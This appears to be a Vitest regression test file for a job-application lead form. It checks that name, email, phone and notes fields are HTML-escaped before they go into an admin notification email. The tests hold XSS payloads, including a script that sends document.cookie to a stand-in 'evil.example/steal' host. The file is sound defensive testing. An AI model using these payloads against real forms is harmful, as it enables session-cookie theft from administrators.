/**
 * POST /api/lead (type: 'job-application') -- admin-notification HTML
 * injection via unescaped name/email/phone/notes.
 *
 * This is a public, unauthenticated, tenant-resolved-by-Host form (rate-limited,
 * not content-validated). The job-application branch hand-rolled its own
 * "New Job Application" admin email with name/email/phoneRaw/notes interpolated
 * RAW -- no escapeHtml(). `notes` in particular is built by buildLeadNotes(),
 * which folds ANY extra body field the caller sends into free-form text, so it
 * is fully attacker-controlled. The identical "New Team/Job Application" email
 * in the sibling routes (contact/route.ts, inquiry/route.ts) already wraps
 * every field in escapeHtml() -- this route was the one outlier that never got
 * the same treatment, despite this file's own header calling itself "the
 * standalone /api/lead route... same destination as /api/contact."
 */
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { NextRequest } from 'next/server'

let capturedHtml = ''
let capturedSubject = ''

vi.mock('@/lib/tenant-site', () => ({
  getTenantFromHeaders: vi.fn(async () => ({ id: 'tenant-1', name: 'Acme', slug: 'acme' })),
  tenantSiteUrl: vi.fn(() => 'https://acme.example.com'),
}))
vi.mock('@/lib/rate-limit-db', () => ({ rateLimitDb: vi.fn(async () => ({ allowed: true, remaining: 2 })) }))
vi.mock('@/lib/notify', () => ({ notify: vi.fn(async () => {}) }))
vi.mock('@/lib/admin-contacts', () => ({
  emailAdmins: vi.fn(async (_tenant: unknown, subject: string, html: string) => {
    capturedSubject = subject
    capturedHtml = html
  }),
}))
vi.mock('@/lib/email-templates', () => ({ adminNewClientEmail: vi.fn(() => ({ subject: 'x', html: 'x' })) }))
vi.mock('@/lib/error-tracking', () => ({ trackError: vi.fn(async () => {}) }))
vi.mock('@/lib/email', () => ({ sendEmail: vi.fn(async () => {}) }))
vi.mock('@/lib/messaging/shell', () => ({ emailShell: vi.fn(() => '<html></html>') }))
vi.mock('@/lib/comms-prefs', () => ({ isCommEnabled: vi.fn(async () => false) }))

vi.mock('@/lib/supabase', () => ({
  supabaseAdmin: {
    from: (table: string) => ({
      select: () => ({
        eq: () => ({
          eq: () => ({
            ilike: () => ({
              limit: () => ({
                maybeSingle: async () => ({ data: null, error: null }),
              }),
            }),
          }),
        }),
      }),
      insert: () => ({
        select: () => ({
          single: async () => ({ data: { id: `${table}-1` }, error: null }),
        }),
      }),
    }),
  },
}))

import { POST } from './route'

function jobApplicationReq(overrides: Record<string, unknown> = {}): NextRequest {
  const body = {
    type: 'job-application',
    name: 'Attacker Name',
    email: 'attacker@evil.com',
    phone: '2125551234',
    ...overrides,
  }
  return new NextRequest('https://acme.example.com/api/lead', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-forwarded-for': '203.0.113.9' },
    body: JSON.stringify(body),
  })
}

describe('POST /api/lead (job-application) — admin email HTML escaping', () => {
  beforeEach(() => {
    capturedHtml = ''
    capturedSubject = ''
  })

  it('escapes an HTML-injection payload in `name` before it reaches the admin email', async () => {
    const res = await POST(jobApplicationReq({ name: '<img src=x onerror=alert(document.cookie)>' }))
    expect(res.status).toBe(200)
    expect(capturedHtml).not.toContain('<img src=x onerror=')
    expect(capturedHtml).toContain('&lt;img src=x onerror=')
  })

  it('escapes an HTML-injection payload in `notes` (free-form extra field folded in by buildLeadNotes)', async () => {
    const res = await POST(
      jobApplicationReq({ availability: '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>' })
    )
    expect(res.status).toBe(200)
    expect(capturedHtml).not.toContain('<script>fetch(')
    expect(capturedHtml).toContain('&lt;script&gt;fetch(')
  })

  it('escapes an HTML-injection payload in `email`/`phone`', async () => {
    const res = await POST(
      jobApplicationReq({ email: '"><img src=x onerror=alert(1)>@evil.com', phone: '"><svg onload=alert(1)>' })
    )
    expect(res.status).toBe(200)
    expect(capturedHtml).not.toContain('"><img src=x onerror=alert(1)>')
    expect(capturedHtml).not.toContain('"><svg onload=alert(1)>')
  })

  it('CONTROL: a benign name/notes still renders legibly in the admin email', async () => {
    const res = await POST(jobApplicationReq({ name: "O'Brien & Sons", availability: 'Weekends only' }))
    expect(res.status).toBe(200)
    expect(capturedSubject).toContain("O'Brien & Sons")
    expect(capturedHtml).toContain('O&#39;Brien &amp; Sons')
    expect(capturedHtml).toContain('Weekends only')
  })
})
